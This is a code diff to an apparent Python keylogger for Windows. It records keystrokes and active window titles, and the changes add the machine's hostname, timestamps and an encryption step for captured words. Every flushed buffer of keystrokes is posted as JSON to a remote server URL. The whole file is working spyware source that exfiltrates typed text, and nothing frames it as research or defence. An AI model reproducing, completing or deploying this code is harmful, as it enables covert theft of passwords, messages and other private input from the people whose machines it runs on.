@@ -1,13 +1,20 @@
+import socket
 import ctypes
 import win32api
 import win32gui
 import win32process
 from pynput.keyboard import Listener, Key
 import requests
+import datetime
+from keylogger.Encryption import encryption
+
+
+def get_system_info():
+    return {
+        "computer_name": socket.gethostname(),
+    }
 
 user32 = ctypes.WinDLL('user32', use_last_error=True)
-kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-
 
 class KeyLogger:
     def __init__(self, server_url, log_file="a.txt", max_words_per_line=10):
@@ -18,6 +25,8 @@ class KeyLogger:
         self.max_words_per_line = max_words_per_line
         self.last_active_window = None
         self.pressed_keys = set()
+        self.computer_name = get_system_info()["computer_name"]
+        self.current_window_title = ""
 
         self.modifier_keys = {
             Key.ctrl_l, Key.ctrl_r,
@@ -36,12 +45,13 @@ class KeyLogger:
         if hwnd != self.last_active_window:
             self.last_active_window = hwnd
             window_title = win32gui.GetWindowText(hwnd)
+            self.current_window_title = window_title
             return window_title
         return None
 
     def send_to_server(self, data):
         try:
-            response = requests.post(self.server_url, json={"log": data})
+            response = requests.post(self.server_url, json=data)
             if response.status_code != 200:
                 print(f"[Warning] Server responded with status code {response.status_code}")
         except Exception as e:
@@ -58,7 +68,6 @@ class KeyLogger:
         title = self.get_active_window_info()
         if title is not None:
             log_line = f"\n\n[Active Window: '{title}']\n"
-            self.send_to_server(log_line)
             self.write_to_file(log_line)
             print(log_line, end='')
 
@@ -88,7 +97,7 @@ class KeyLogger:
             word = self.current_word
 
         if word:
-            self.words_buffer.append(word)
+            self.words_buffer.append(encryption(word))
             self.current_word = ""
 
         if len(self.words_buffer) >= self.max_words_per_line:
@@ -96,15 +105,31 @@ class KeyLogger:
 
     def flush_buffer(self, newline=False, final=False):
         if final and self.current_word:
-            self.words_buffer.append(self.current_word)
+            self.words_buffer.append(encryption(self.current_word))
             self.current_word = ""
 
         if self.words_buffer:
             line = ' '.join(self.words_buffer)
+            timestamp_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+
+            json_data = {
+                "computer_name": self.computer_name,
+                "timestamp": timestamp_str,
+                "active_window": self.current_window_title,
+                "log": line
+            }
+
+
+            self.send_to_server(json_data)
+
+
+            line_to_write = f"{line}  [{timestamp_str}] [Window: {self.current_window_title}]\n"
+            self.write_to_file(line_to_write)
+
             if newline:
-                line += '\n'
-            self.send_to_server(line)
-            self.write_to_file(line)
+                print(f"  [{timestamp_str}]\n", end='')
+
             self.words_buffer = []
 
     def on_key_press(self, key):
@@ -163,10 +188,16 @@ class KeyLogger:
         with Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
             listener.join()
 
-
 if __name__ == "__main__":
-    SERVER_URL = "https://your-server-address.com/endpoint"
+    SERVER_URL = "https://fv"
     LOG_FILE = "a.txt"
 
     keylogger = KeyLogger(server_url=SERVER_URL, log_file=LOG_FILE)
+
+
+    system_info = get_system_info()
+    system_info_line = f"[System Info] Computer Name: {system_info['computer_name']}\n"
+    keylogger.write_to_file(system_info_line)
+    print(system_info_line)
+
     keylogger.run()
